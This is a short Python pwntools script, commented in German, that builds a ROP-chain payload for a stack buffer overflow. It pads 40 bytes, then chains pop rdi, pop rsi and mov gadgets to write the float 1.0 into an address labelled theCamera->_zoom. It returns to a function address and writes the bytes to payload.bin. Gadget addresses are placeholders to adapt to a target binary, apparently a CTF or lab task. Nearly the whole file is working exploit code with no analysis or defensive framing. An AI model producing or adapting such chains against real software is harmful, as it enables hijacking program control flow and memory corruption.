#!/usr/bin/env python3
from pwn import *
import struct

def p64(val):
    """Packt einen 64-Bit-Wert im Little-Endian-Format."""
    return struct.pack("<Q", val)

def p32(val):
    """Packt einen 32-Bit-Wert im Little-Endian-Format."""
    return struct.pack("<I", val)

# --- Gadgets (bitte an dein Binary anpassen) ---
# Gadget: pop rdi ; pop rbp ; ret
pop_rdi_ret = 0x7ead + 0x555555554000
# Gadget: pop rsi ; pop rbp ; ret
pop_rsi_ret = 0x7626 + 0x555555554000
# Gadget: mov dword ptr [rdi], esi ; ret
mov_dword_ptr_rdi_esi_ret = 0x9c434 + 0x7ffff7600000

exit_address = 0x3f19 + 0x555555554000
afterSetZoom = 0x0000555555557f19

# --- Zieladresse und zu setzender Wert ---
# Adresse von theCamera->_zoom (Platzhalter, bitte anpassen)
theCamera_zoom = 0x7fffffffd1c0
# Bitmuster für 1.0 als 32-Bit Float (IEEE-754)
value_1_0 = 0x000000003F800000

# Dummy-Wert für rbp-Pops (beliebig wählbar)
dummy = 0x4141414141414141

# --- Aufbau der ROP-Kette ---
# 1. Mit "pop rdi ; pop rbp ; ret" die Adresse von theCamera->_zoom in rdi laden;
#    dabei wird als zweiter Wert ein Dummy in rbp gepopt.
# 2. Mit "pop rsi ; pop rbp ; ret" den Wert 1.0 (als Bitmuster) in rsi laden;
#    auch hier muss ein Dummy als rbp-Wert übergeben werden.
# 3. Mit "mov dword ptr [rdi], esi ; ret" wird aus rsi an der Adresse in rdi geschrieben.
payload = b"A" * 40
payload += p64(pop_rdi_ret)
payload += p64(theCamera_zoom)  # rdi = Adresse von theCamera->_zoom
payload += p64(dummy)           # Dummy für rbp
payload += p64(pop_rsi_ret)
payload += p64(value_1_0)         # rsi = Bitmuster 1.0
payload += p64(dummy)           # Dummy für rbp
payload += p64(mov_dword_ptr_rdi_esi_ret)

payload += p64(afterSetZoom)

# --- Payload in payload.bin speichern ---
with open("payload.bin", "wb") as f:
    f.write(payload)
